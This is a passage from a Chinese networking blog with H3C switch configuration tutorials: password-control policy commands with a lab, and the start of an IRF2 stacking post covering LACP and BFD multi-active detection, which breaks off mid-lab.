<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><h2 id="使能密码管理"><a href="#使能密码管理" class="headerlink" title="使能密码管理"></a>使能密码管理</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>进入系统视图</td>
<td><strong>system-view</strong></td>
<td>-</td>
</tr>
<tr>
<td>使能全局密码管理功能</td>
<td><strong>password-control enable</strong></td>
<td>**[必选]**缺省情况下，全局密码管理功能处于未使能状态</td>
</tr>
<tr>
<td>使能指定的密码管理功能</td>
<td><strong>password-control { aging &#x2F; composition &#x2F; history &#x2F; length } enable</strong></td>
<td>[可选]缺省情况下，各密码管理功能均处于使能状态</td>
</tr>
</tbody></table>
<h2 id="全局密码管理"><a href="#全局密码管理" class="headerlink" title="全局密码管理"></a>全局密码管理</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>进入系统视图</td>
<td><strong>system-view</strong></td>
<td>-</td>
</tr>
<tr>
<td>配置密码的老化时间</td>
<td><strong>password-control aging</strong> <em>aging-time</em></td>
<td>[可选]缺省情况下，密码的老化时间为90天</td>
</tr>
<tr>
<td>配置密码更新的最小时间间隔</td>
<td><strong>password-control password update interval</strong> <em>interval</em></td>
<td>[可选]缺省情况下，密码更新的最小时间间隔为24小时</td>
</tr>
<tr>
<td>配置密码的最小长度</td>
<td><strong>password-control length</strong> <em>length</em></td>
<td>[可选]缺省情况下，密码的最小长度为10个字符</td>
</tr>
<tr>
<td>配置用户密码的组合策略</td>
<td><strong>password-control composition type-number</strong> <em>policy-type</em> <strong>[ type-length</strong> <em>type-length</em> <strong>]</strong></td>
<td>[可选]缺省情况下，密码元素的组合类型至少为1种，至少要包含每种元素的个数为1个</td>
</tr>
<tr>
<td>配置用户密码的复杂度检查策略</td>
<td><strong>password-control complexity { same-character &#x2F; user-name } check</strong></td>
<td>[可选]缺省情况下，不对用户密码进行复杂度检查</td>
</tr>
<tr>
<td>配置每个用户密码历史记录的最大条数</td>
<td><strong>password-control history</strong> <em>max-record-num</em></td>
<td>[可选]缺省情况下，每个用户密码历史记录的最大条数为4条</td>
</tr>
<tr>
<td>配置用户登录尝试次数以及登录尝试失败后的行为</td>
<td><strong>password-control login-attempt</strong> <em>login-times</em> <strong>[ exceed { lock &#x2F; unlock &#x2F; lock-time</strong> <em>time</em> <strong>} ]</strong></td>
<td>[可选]缺省情况下，用户登录尝试次数为3次；如果用户登录失败，则1分钟后再允许该用户重新登录</td>
</tr>
<tr>
<td>配置密码老化前的提醒时间</td>
<td><strong>password-control alert-before-expire</strong> <em>alert-time</em></td>
<td>[可选]缺省情况下，密码老化前的提醒时间为7天</td>
</tr>
<tr>
<td>配置密码过期后允许用户登录的时间和次数</td>
<td><strong>password-control expired-user-login delay</strong> <em>delay</em> <strong>times</strong> <em>times</em></td>
<td>[可选]缺省情况下，密码过期后的30天内允许用户登录3次</td>
</tr>
<tr>
<td>配置用户认证的超时时间</td>
<td><strong>password-control authentication-timeout</strong> <em>authentication-timeout</em></td>
<td>[可选]缺省情况下，用户认证的超时时间为60秒</td>
</tr>
<tr>
<td>配置用户帐号的闲置时间</td>
<td><strong>password-control login idle-time</strong> <em>idle-time</em></td>
<td>[可选]缺省情况下，用户帐号的闲置时间为90天</td>
</tr>
</tbody></table>
<h2 id="用户组密码管理"><a href="#用户组密码管理" class="headerlink" title="用户组密码管理"></a>用户组密码管理</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>进入系统视图</td>
<td><strong>system-view</strong></td>
<td>-</td>
</tr>
<tr>
<td>创建用户组，并进入用户组视图</td>
<td><strong>user-group</strong> <em>group-name</em></td>
<td>-</td>
</tr>
<tr>
<td>配置用户组的密码老化时间</td>
<td><strong>password-control aging</strong> <em>aging-time</em></td>
<td>[可选]缺省情况下，采用全局密码老化时间</td>
</tr>
<tr>
<td>配置用户组的密码最小长度</td>
<td><strong>password-control length</strong> <em>length</em></td>
<td>[可选]缺省情况下，采用全局密码最小长度</td>
</tr>
<tr>
<td>配置用户组的密码组合策略</td>
<td><strong>password-control composition type-number</strong> <em>type-number</em> <strong>[ type-length</strong> <em>type-length</em> <strong>]</strong></td>
<td>[可选]缺省情况下，采用全局密码组合策略</td>
</tr>
</tbody></table>
<h2 id="本地用户密码管理"><a href="#本地用户密码管理" class="headerlink" title="本地用户密码管理"></a>本地用户密码管理</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>进入系统视图</td>
<td><strong>system-view</strong></td>
<td>-</td>
</tr>
<tr>
<td>创建本地用户，并进入本地用户视图</td>
<td><strong>local-user</strong> <em>user-name</em></td>
<td>-</td>
</tr>
<tr>
<td>配置本地用户的密码老化时间</td>
<td><strong>password-control aging</strong> <em>aging-time</em></td>
<td>[可选]缺省情况下，采用本地用户所属用户组的密码老化时间，若用户组未配置该值，则采用全局配置</td>
</tr>
<tr>
<td>配置本地用户的密码最小长度</td>
<td><strong>password-control length</strong> <em>length</em></td>
<td>[可选]缺省情况下，采用本地用户所属用户组的密码最小长度，若用户组未配置该值，则采用全局配置</td>
</tr>
<tr>
<td>配置本地用户的密码组合策略</td>
<td><strong>password-control composition type-number</strong> <em>type-number</em> <strong>[ type-length</strong> <em>type-length</em> <strong>]</strong></td>
<td>[可选]缺省情况下，采用本地用户所属用户组的密码组合策略，若用户组未配置该值，则采用全局配置</td>
</tr>
</tbody></table>
<h2 id="super密码管理"><a href="#super密码管理" class="headerlink" title="super密码管理"></a>super密码管理</h2><table>
<thead>
<tr>
<th>操作</th>
<th>命令</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>进入系统视图</td>
<td><strong>system-view</strong></td>
<td>-</td>
</tr>
<tr>
<td>配置super密码的老化时间</td>
<td><strong>password-control super aging</strong> <em>aging-time</em></td>
<td>[可选]缺省情况下，密码的老化时间为90天</td>
</tr>
<tr>
<td>配置super密码的最小长度</td>
<td><strong>password-control super length</strong> <em>length</em></td>
<td>[可选]缺省情况下，密码的最小长度为10个字符</td>
</tr>
<tr>
<td>配置super密码的组合策略</td>
<td><strong>password-control super composition type-number</strong> <em>type-number</em> <strong>[ type-length</strong> <em>type-length</em> <strong>]</strong></td>
<td>[可选]缺省情况下，密码元素的组合类型至少为1种，至少要包含每种元素的个数为1个</td>
</tr>
</tbody></table>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="组网需求"><a href="#组网需求" class="headerlink" title="组网需求"></a>组网需求</h2><p>有以下密码管理需求：</p>
<ul>
<li><p>全局密码管理策略：用户2次登录失败后就永久禁止登录；密码老化时间为30天；允许用户进行密码更新的最小时间间隔为36小时；密码过期后60天内允许登录5次；用户帐号的闲置时间为30天；不允许密码中包含用户名或者颠倒用户名；不允许密码中包含连续三个或以上字符。</p>
</li>
<li><p>super密码管理策略：密码元素的最少组合类型为3种，至少要包含每种元素的个数为5个。</p>
</li>
<li><p>本地Telnet用户test的密码管理策略：最小密码长度为12个字符，密码元素的最少组合类型为2种，至少要包含每种元素的个数为5个，密码老化时间为20天。</p>
</li>
</ul>
<h2 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 全局密码配置</span><br><span class="line">[H3C]password-control enable</span><br><span class="line">[H3C]password-control login-attempt 2 exceed lock</span><br><span class="line">[H3C]password-control aging 30</span><br><span class="line">[H3C]password-control update-interval 36</span><br><span class="line">[H3C]password-control expired-user-login delay 60 times 5</span><br><span class="line">[H3C]password-control login idle-time 30</span><br><span class="line">[H3C]password-control complexity user-name check</span><br><span class="line">[H3C]password-control complexity same-character check</span><br><span class="line"></span><br><span class="line"># super密码配置</span><br><span class="line">[H3C]password-control super composition type-number 3 type-length 5</span><br><span class="line"></span><br><span class="line"># 本地用户密码配置</span><br><span class="line">[H3C]local-user test</span><br><span class="line">[H3C-luser-manage-test]service-type telnet</span><br><span class="line">[H3C-luser-manage-test]password-control length 12</span><br><span class="line">[H3C-luser-manage-test]password-control composition type-number 2 type-length 5</span><br><span class="line">[H3C-luser-manage-test]password-control aging 20</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># dis密码控制信息</span><br><span class="line">[H3C]dis password-control</span><br><span class="line"> Global password control configurations:</span><br><span class="line"> Password control:                    Enabled</span><br><span class="line"> Password aging:                      Enabled (30 days)</span><br><span class="line"> Password length:                     Enabled (10 characters)</span><br><span class="line"> Password composition:                Enabled (1 types, 1 characters per type)</span><br><span class="line"> Password history:                    Enabled (max history records:4)</span><br><span class="line"> Early notice on password expiration: 7 days</span><br><span class="line"> Maximum login attempts:              2</span><br><span class="line"> Action for exceeding login attempts: Lock</span><br><span class="line"> Minimum interval between two updates:36 hours</span><br><span class="line"> User account idle time:              30 days</span><br><span class="line"> Logins with aged password:           5 times in 60 days</span><br><span class="line"> Password complexity:                 Enabled (username checking)</span><br><span class="line">                                      Enabled (repeated characters checking)</span><br><span class="line"></span><br><span class="line">[H3C]dis password-control super</span><br><span class="line"> Super password control configurations:</span><br><span class="line"> Password aging:                      Enabled (90 days)</span><br><span class="line"> Password length:                     Enabled (10 characters)</span><br><span class="line"> Password composition:                Enabled (3 types, 5 characters per type)</span><br><span class="line"></span><br><span class="line">[H3C]dis local-user user-name test class manage</span><br><span class="line">Total 1 local users matched.</span><br><span class="line"></span><br><span class="line">Device management user test:</span><br><span class="line">  State:                     Active</span><br><span class="line">  Service type:              Telnet</span><br><span class="line">  User group:                system</span><br><span class="line">  Bind attributes:</span><br><span class="line">  Authorization attributes:</span><br><span class="line">    Work directory:          flash:</span><br><span class="line">    User role list:          network-operator</span><br><span class="line">  Password control configurations:</span><br><span class="line">    Password aging:          20 days</span><br><span class="line">    Password length:         12 characters</span><br><span class="line">    Password composition:    2 types, 5 characters per type</span><br></pre></td></tr></table></figure>

<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li>H3C S5820X[S5800]系列以太网交换机 配置指导-Release 1211-6W100 安全配置指导 Password Control配置-新华三集团-H3C(<a href="http://www.h3c.com/cn/d_201104/713866_30005_0.htm">http://www.h3c.com/cn/d_201104/713866_30005_0.htm</a>)</li>
</ol>
]]></content>
      <tags>
        <tag>信息网络</tag>
        <tag>H3C</tag>
        <tag>密码管理</tag>
      </tags>
  </entry>
  <entry>
    <title>【信息网络学习 H3C设备配置IRF2】</title>
    <url>/1035/</url>
    <content><![CDATA[<p>IRF（Intelligent Resilient Framework，智能弹性架构）是H3C自主研发的软件虚拟化技术。它的核心思想是将多台设备连接在一起，进行必要的配置后，虚拟化成一台设备。使用这种虚拟化技术可以集合多台设备的硬件资源和软件处理能力，实现多台设备的协同工作、统一管理和不间断维护。</p>
<p>在H3C模拟器上配置IRF2，并搭配<strong>LACP MAD检测</strong>、<strong>BFD MAD检测</strong>实验，系统版本v7。</p>
<span id="more"></span>

<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><h2 id="IRF2介绍"><a href="#IRF2介绍" class="headerlink" title="IRF2介绍"></a>IRF2介绍</h2><ol>
<li><p>IRF2（Intelligent Resilient Framework II，第二代智能弹性架构）是H3C研发的软件虚拟化技术。</p>
</li>
<li><p>IRF2允许将多台设备连接在一起，形成一个IRF2堆叠：</p>
</li>
</ol>
<ul>
<li>一个IRF2堆叠相当于一台“虚拟设备”</li>
<li>IRF2堆叠中的主设备和从设备保持配置和运行状态同步，实现1:N备份，保证高可靠性</li>
<li>可实现多台设备的协同工作、统一管理和不间断维护</li>
</ul>
<h2 id="IRF2堆叠"><a href="#IRF2堆叠" class="headerlink" title="IRF2堆叠"></a>IRF2堆叠</h2><p><img src="/1035/1.PNG"></p>
<p>一个IRF2堆叠的功能等效于一台虚拟的逻辑设备。</p>
<p>其优点包括：</p>
<ul>
<li>简化管理</li>
<li>提高性能</li>
<li>弹性扩展</li>
<li>高可靠性</li>
</ul>
<p>IRF2堆叠拓扑有两种——链形拓扑和环形拓扑：</p>
<p><img src="/1035/2.PNG"></p>
<p>一个IRF2堆叠由一组相同型号的成员设备组成，成员设备分为Master和Slave两种角色。</p>
<h2 id="IRF2-Domain-ID"><a href="#IRF2-Domain-ID" class="headerlink" title="IRF2 Domain ID"></a>IRF2 Domain ID</h2><p><img src="/1035/3.PNG"></p>
<ul>
<li>IRF2以Domain ID（域编号）来区分不同的IRF2堆叠</li>
<li>只有Domain ID相同的设备才可能加入同一IRF2堆叠</li>
</ul>
<h2 id="IRF2成员编号（Member-ID）"><a href="#IRF2成员编号（Member-ID）" class="headerlink" title="IRF2成员编号（Member ID）"></a>IRF2成员编号（Member ID）</h2><ul>
<li>在IRF2中以成员编号（Member ID）标识设备：</li>
</ul>
<ol>
<li>各设备成员编号必须唯一</li>
<li>在配置IRF2前，需要规划好每台设备的成员编号，并分别在设备上进行配置</li>
</ol>
<ul>
<li><p>配置IRF端口和优先级也是根据设备的成员编号来进行的，修改后的成员编号需要重启才能生效</p>
</li>
<li><p>修改设备成员编号可能导致设备配置发生变化或丢失</p>
</li>
<li><p>Master的Member ID也称为Active ID</p>
</li>
</ul>
<h2 id="IRF2-Master选举规则"><a href="#IRF2-Master选举规则" class="headerlink" title="IRF2 Master选举规则"></a>IRF2 Master选举规则</h2><p><img src="/1035/4.PNG"></p>
<h2 id="IRF2-MAD检测"><a href="#IRF2-MAD检测" class="headerlink" title="IRF2 MAD检测"></a>IRF2 MAD检测</h2><ul>
<li>IRF2采用MAD（Multi-Active Detection，多Active检测）解决分裂后的冲突问题：</li>
</ul>
<ol>
<li>使Master成员编号最小的堆叠维持Active状态（正常工作状态）</li>
<li>使其它堆叠迁移到Recovery 状态（禁用状态），并关闭其成员设备上除保留端口以外的其它所有物理端口（通常为业务接口）</li>
</ol>
<ul>
<li>MAD检测的方法：</li>
</ul>
<ol>
<li><strong>基于LACP的MAD检测</strong></li>
<li><strong>基于BFD的MAD检测</strong></li>
</ol>
<h3 id="基于LACP的MAD检测"><a href="#基于LACP的MAD检测" class="headerlink" title="基于LACP的MAD检测"></a>基于LACP的MAD检测</h3><p><img src="/1035/5.PNG"></p>
<ul>
<li>扩展LACP消息携带Active ID</li>
<li>Active ID大的一方竞争失败，迁移到Recovery 状态</li>
<li>要求相邻的交换机必须为支持此检测特性的H3C设备</li>
</ul>
<h3 id="基于BFD的MAD检测"><a href="#基于BFD的MAD检测" class="headerlink" title="基于BFD的MAD检测"></a>基于BFD的MAD检测</h3><p><img src="/1035/6.PNG"></p>
<ul>
<li>IRF2堆叠内的成员设备通过三层口连接，并分别配置一个BFD检测地址，使能BFD MAD检测</li>
<li>正常工作时，BFD主设备地址生效，备设备地址不生效，BFD会话DOWN</li>
<li>IRF2堆叠分裂时，两个地址同时生效，BFD会话UP，BFD MAD检测生效后，会话再次DOWN</li>
<li>Active ID大的一方竞争失败，迁移到Recovery 状态</li>
<li>BFD检测单独占用一对端口和一个VLAN</li>
</ul>
<h3 id="两种Active检测方式的对比"><a href="#两种Active检测方式的对比" class="headerlink" title="两种Active检测方式的对比"></a>两种Active检测方式的对比</h3><table>
<thead>
<tr>
<th>方式</th>
<th>优点</th>
<th>适用性要求</th>
</tr>
</thead>
<tbody><tr>
<td>LACP方式</td>
<td>1.在相邻的IRF2堆叠上同时启动此检测方式，堆叠之间可互相检测分裂；2.不需要占用专门检测端口</td>
<td>IRF2堆叠和接入交换机均需支持该特性</td>
</tr>
<tr>
<td>BFD方式</td>
<td>1.可以独立检测本IRF2堆叠分裂情况；2.对上下游设备无要求；3.检测速度快</td>
<td>需要专用端口和VLAN</td>
</tr>
</tbody></table>
<h3 id="MAD故障恢复"><a href="#MAD故障恢复" class="headerlink" title="MAD故障恢复"></a>MAD故障恢复</h3><ol>
<li>IRF链路修复：</li>
</ol>
<p><img src="/1035/7.PNG"></p>
<ol start="2">
<li>IRF链路故障修复前，正常工作状态的IRF故障使用<code>mad restore</code>命令恢复：</li>
</ol>
<p><img src="/1035/8.PNG"></p>
<h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><table>
<thead>
<tr>
<th>方式</th>
<th>配置</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><strong>BFD MAD</strong></td>
<td><strong>[Switch-Vlan-interface3] mad bfd enable</strong></td>
<td>1.缺省情况下，没有使能BFD MAD检测功能，也未配置MAD IP地址。</td>
</tr>
<tr>
<td></td>
<td><strong>[Switch-Vlan-interface3] mad ip address</strong> <em>ip-address { mask &#x2F; mask-length }</em> <strong>member</strong> <em>member-id</em></td>
<td>2.MAD IP不能与其他接口IP地址相同。3.不能在Vlan-interface1接口下使能BFD MAD检测功能。</td>
</tr>
<tr>
<td><strong>LACP MAD</strong></td>
<td><strong>[Switch-Bridge-Aggregation1] mad enable</strong></td>
<td>1.缺省情况下，LACP MAD检测未使能。2.由于LACP MAD检测依赖于LACP协议，因此需要配置聚合组工作在动态聚合模式下。3.LACP对端设备必须能够识别、处理携带了ActiveID值的LACP PDU协议报文。</td>
</tr>
</tbody></table>
<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="IRF2"><a href="#IRF2" class="headerlink" title="IRF2"></a>IRF2</h2><h3 id="拓扑"><a href="#拓扑" class="headerlink" title="拓扑"></a>拓扑</h3><p>按照下图拓扑连线：</p>
<p><img src="/1035/9.PNG"></p>
<h3 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h3><p>首先在<code>SWA</code>上进行配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 先关闭使用的堆叠口</span><br><span class="line">[SWA]interface Ten-GigabitEthernet 1/0/49</span><br><span class="line">[SWA-Ten-GigabitEthernet1/0/49]shutdown</span><br><span class="line">[SWA-Ten-GigabitEthernet1/0/49]quit</span><br><span class="line"></span><br><span class="line"># 创建IRF端口</span><br><span class="line">[SWA]irf-port 1/1</span><br><span class="line">[SWA-irf-port1/1]port group interface Ten-GigabitEthernet 1/0/49</span><br><span class="line">You must perform the following tasks for a successful IRF setup:</span><br><span class="line">Save the configuration after completing IRF configuration.</span><br><span class="line">Execute the &quot;irf-port-configuration active&quot; command to activate the IRF ports.</span><br><span class="line">[SWA-irf-port1/1]quit</span><br><span class="line"></span><br><span class="line"># 配置优先级</span><br><span class="line">[SWA]irf member 1 priority  30</span><br><span class="line"></span><br><span class="line"># 再开启使用的堆叠口</span><br><span class="line">[SWA]interface Ten-GigabitEthernet 1/0/49</span><br><span class="line">[SWA-Ten-GigabitEthernet1/0/49]undo shutdown</span><br><span class="line">[SWA-Ten-GigabitEthernet1/0/49]quit</span><br><span class="line"></span><br><span class="line"># 激活irf配置</span><br><span class="line">[SWA]save</span><br><span class="line">[SWA]irf-port-configuration active</span><br></pre></td></tr></table></figure>

<p>然后在<code>SWB</code>上进行配置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 重命名member号为2</span><br><span class="line">[SWB]irf member 1 renumber 2</span><br><span class="line">Renumbering the member ID may result in configuration change or loss. Continue?[Y/N]:y</span><br><span class="line">[SWB]quit</span><br><span class="line">&lt;SWB&gt;reboot</span><br><span class="line"></span><br><span class="line"># 先关闭使用的堆叠口，此时口的member号已修改成2</span><br><span class="line">[SWB]interface Ten-GigabitEthernet 2/0/49</span><br><span class="line">[SWB-Ten-GigabitEthernet2/0/49]shutdown</span><br><span class="line">[SWB-Ten-GigabitEthernet2/0/49]quit</span><br><span class="line"></span><br><span class="line"># 创建IRF端口，注意做堆叠时port-number不能相同，故只能是2/2，不能是2/1</span><br><span class="line">[SWB]irf-port 2/2</span><br><span class="line">[SWB-irf-port2/2]port group interface Ten-GigabitEthernet 2/0/49</span><br><span class="line">[SWB-irf-port2/2]quit</span><br><span class="line"></span><br><span class="line"># 再开启使用的堆叠口</span><br><span class="line">[SWB]interface Ten-GigabitEthernet 2/0/49</span><br><span class="line">[SWB-Ten-GigabitEthernet2/0/49]undo shutdown</span><br><span class="line">[SWB-Ten-GigabitEthernet2/0/49]quit</span><br><span class="line"></span><br><span class="line"># 激活irf配置</span><br><span class="line">[SWB]save</span><br><span class="line">[SWB]irf-port-configuration active</span><br></pre></td></tr></table></figure>

<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>配置完成后<code>SWB</code>自动重启，重启之后是<code>SWA</code>的界面。</p>
<p>在<code>SWA</code>上查看irf相关信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis irf</span><br><span class="line">MemberID    Role    Priority  CPU-Mac         Description</span><br><span class="line"> *+1        Master  30        7490-4d85-0104  ---</span><br><span class="line">   2        Standby 1         7490-51eb-0204  ---</span><br><span class="line">--------------------------------------------------</span><br><span class="line"> * indicates the device is the master.</span><br><span class="line"> + indicates the device through which the user logs in.</span><br><span class="line"></span><br><span class="line"> The bridge MAC of the IRF is: 7490-4d85-0100</span><br><span class="line"> Auto upgrade                : yes</span><br><span class="line"> Mac persistent              : 6 min</span><br><span class="line"> Domain ID                   : 0</span><br><span class="line"></span><br><span class="line">[SWA]dis irf configuration</span><br><span class="line"> MemberID NewID    IRF-Port1                     IRF-Port2</span><br><span class="line"> 1        1        Ten-GigabitEthernet1/0/49     disable</span><br><span class="line"> 2        2        disable                       Ten-GigabitEthernet2/0/49</span><br><span class="line"></span><br><span class="line">[SWA]dis irf topology</span><br><span class="line">                              Topology Info</span><br><span class="line"> -------------------------------------------------------------------------</span><br><span class="line">               IRF-Port1                IRF-Port2</span><br><span class="line"> MemberID    Link       neighbor      Link       neighbor    Belong To</span><br><span class="line"> 2           DIS        ---           UP         1           7490-4d85-0104</span><br><span class="line"> 1           UP         2             DIS        ---         7490-4d85-0104</span><br></pre></td></tr></table></figure>

<p>在<code>SWB</code>上查看irf相关信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis irf</span><br><span class="line">MemberID    Role    Priority  CPU-Mac         Description</span><br><span class="line">  *1        Master  30        7490-4d85-0104  ---</span><br><span class="line">  +2        Standby 1         7490-51eb-0204  ---</span><br><span class="line">--------------------------------------------------</span><br><span class="line"> * indicates the device is the master.</span><br><span class="line"> + indicates the device through which the user logs in.</span><br><span class="line"></span><br><span class="line"> The bridge MAC of the IRF is: 7490-4d85-0100</span><br><span class="line"> Auto upgrade                : yes</span><br><span class="line"> Mac persistent              : 6 min</span><br><span class="line"> Domain ID                   : 0</span><br><span class="line"></span><br><span class="line">[SWA]dis irf configuration</span><br><span class="line"> MemberID NewID    IRF-Port1                     IRF-Port2</span><br><span class="line"> 1        1        Ten-GigabitEthernet1/0/49     disable</span><br><span class="line"> 2        2        disable                       Ten-GigabitEthernet2/0/49</span><br><span class="line"></span><br><span class="line">[SWA]dis irf topology</span><br><span class="line">                              Topology Info</span><br><span class="line"> -------------------------------------------------------------------------</span><br><span class="line">               IRF-Port1                IRF-Port2</span><br><span class="line"> MemberID    Link       neighbor      Link       neighbor    Belong To</span><br><span class="line"> 2           DIS        ---           UP         1           7490-4d85-0104</span><br><span class="line"> 1           UP         2             DIS        ---         7490-4d85-0104</span><br></pre></td></tr></table></figure>

<h2 id="IRF2-上配置-BFD-MAD"><a href="#IRF2-上配置-BFD-MAD" class="headerlink" title="IRF2 上配置 BFD MAD"></a>IRF2 上配置 BFD MAD</h2><h3 id="拓扑-1"><a href="#拓扑-1" class="headerlink" title="拓扑"></a>拓扑</h3><p>按照下图拓扑连线：</p>
<p><img src="/1035/10.PNG"></p>
<h3 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h3><p>使用上面实验中的IRF2配置，配置BFD MAD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]vlan 3</span><br><span class="line">[SWA-vlan3]port GigabitEthernet 1/0/1 GigabitEthernet 2/0/1</span><br><span class="line"></span><br><span class="line"># 在vlan3虚接口中开启bfd mad</span><br><span class="line">[SWA]interface  vlan 3</span><br><span class="line">[SWA-Vlan-interface3]mad bfd enable</span><br><span class="line">[SWA-Vlan-interface3]mad ip address 192.168.2.1 24 member 1</span><br><span class="line">[SWA-Vlan-interface3]mad ip address 192.168.2.2 24 member 2</span><br><span class="line">[SWA-Vlan-interface3]quit</span><br><span class="line"></span><br><span class="line"># 关闭端口stp协议</span><br><span class="line">[SWA]interface GigabitEthernet 1/0/1</span><br><span class="line">[SWA-GigabitEthernet1/0/1]undo stp enable</span><br><span class="line">[SWA-GigabitEthernet1/0/1]quit</span><br><span class="line">[SWA]int GigabitEthernet 2/0/1</span><br><span class="line">[SWA-GigabitEthernet2/0/1]undo stp enable</span><br><span class="line">[SWA-GigabitEthernet2/0/1]quit</span><br><span class="line">[SWA]save</span><br></pre></td></tr></table></figure>

<h3 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h3><p>配置完成后查看MAD信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]dis mad</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP disabled.</span><br><span class="line">MAD BFD enabled.</span><br><span class="line"></span><br><span class="line">[SWA]dis mad verbose</span><br><span class="line">Multi-active recovery state: No</span><br><span class="line">Excluded ports (user-configured):</span><br><span class="line">Excluded ports (system-configured):</span><br><span class="line">  Ten-GigabitEthernet1/0/49</span><br><span class="line">  Ten-GigabitEthernet2/0/49</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP disabled.</span><br><span class="line">MAD BFD enabled interface: Vlan-interface3</span><br><span class="line">  MAD status                 : Faulty</span><br><span class="line">  Member ID   MAD IP address       Neighbor   MAD status</span><br><span class="line">  1           192.168.2.1/24       2          Faulty</span><br><span class="line">  2           192.168.2.2/24       1          Faulty</span><br></pre></td></tr></table></figure>

<p>此时在<code>SWA</code>上断掉<strong>Ten1&#x2F;0&#x2F;49</strong>口模拟线缆中断，再从<code>SWA</code>查看MAD信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[SWA]int Ten-GigabitEthernet 1/0/49</span><br><span class="line">[SWA-Ten-GigabitEthernet1/0/49]shutdown</span><br><span class="line">[SWA-Ten-GigabitEthernet1/0/49]quit</span><br><span class="line"></span><br><span class="line">[SWA]dis mad verbose</span><br><span class="line">Multi-active recovery state: No</span><br><span class="line">Excluded ports (user-configured):</span><br><span class="line">Excluded ports (system-configured):</span><br><span class="line">  Ten-GigabitEthernet1/0/49</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP disabled.</span><br><span class="line">MAD BFD enabled interface: Vlan-interface3</span><br><span class="line">  MAD status                 : Faulty</span><br><span class="line">  Member ID   MAD IP address       Neighbor   MAD status</span><br><span class="line">  1           192.168.2.1/24       2          Faulty</span><br></pre></td></tr></table></figure>

<p>再到<code>SWB</code>上查看MAD信息：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;SWA&gt;dis mad verbose</span><br><span class="line">Multi-active recovery state: Yes</span><br><span class="line">Excluded ports (user-configured):</span><br><span class="line">Excluded ports (system-configured):</span><br><span class="line">  Ten-GigabitEthernet2/0/49</span><br><span class="line">MAD ARP disabled.</span><br><span class="line">MAD ND disabled.</span><br><span class="line">MAD LACP disabled.</span><br><span class="line">MAD BFD enabled interface: Vlan-interface3</span><br><span class="line">  MAD status                 : Faulty</span><br><span class="line">  Member ID   MAD IP address       Neighbor   MAD status</span><br><span class="line">  2           192.168.2.2/24       1          Faulty</span><br></pre></td></tr></table></figure>

<p>可以看到此时<code>SWB</code>是<strong>recovery</strong>模式。</p>
<p>回到<code>SWA</code>将线缆恢复，可以看到<code>SWA</code>和<code>SWB</code>又重新堆叠在了一起。</p>
<h2 id="IRF2-上配置-LACP-MAD"><a href="#IRF2-上配置-LACP-MAD" class="headerlink" title="IRF2 上配置 LACP MAD"></a>IRF2 上配置 LACP MAD</h2><h3 id="拓扑-2"><a href="#拓扑-2" class="headerlink" title="拓扑"></a>拓扑</h3><p>按照下图拓扑连线：</p>
<p><img src="/1035/11.PNG"></p>
<h3 id="配置-3"><a href="#配置-3" class="headerlink" title="配置"></a>配置</h3><p>使用上面实验中的IRF2配置，配置LACP MAD：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># SWA上配置LACP</span><br><span class="line">[SWA]interface Bridge-Aggregation 2</span><br><span class="line">[SWA-Bridge-Aggregation2]link-aggregation mode dynamic</span><br><span class="line">[SWA-Bridge-Aggregation2]mad enable</span><br><span class="line">You need to assign a domain ID (range: 0-4294967295)</span><br><span class="line">[Current domain is: 0]: 0</span><br><span class="line">The assigned domain ID is: 0</span><br><span class="line">[SWA-Bridge-Aggregation2]quit</span><br><span class="line"></span><br><span class="line">[SWA]int range g1/0/1 g2/0/1</span><br><span class="line">[SWA-if-range]port link-aggregation group 2</span><br><span class="line">[SWA-if-range]quit</span><br><span class="line"></span><br><span class="line"># SWC上配置LACP</span><br><span class="line">[SWC]interface Bridge-Aggregation 2</span><br><span class="line">[SWC-Bridge-Aggregation2]link-aggregation mode dynamic</span><br><span class="line">[SWC-Bridge-Aggregation2]quit</span><br><span class="line"></span><br><span class="line">[SWC]int range g1/0/1 g1/0/2</span><br><span class="line">[SWC-if-range]port link-aggregation group 2</span><br><span class="line">[SWC-if-range]quit</span><br></pre></td></tr></table></figure>

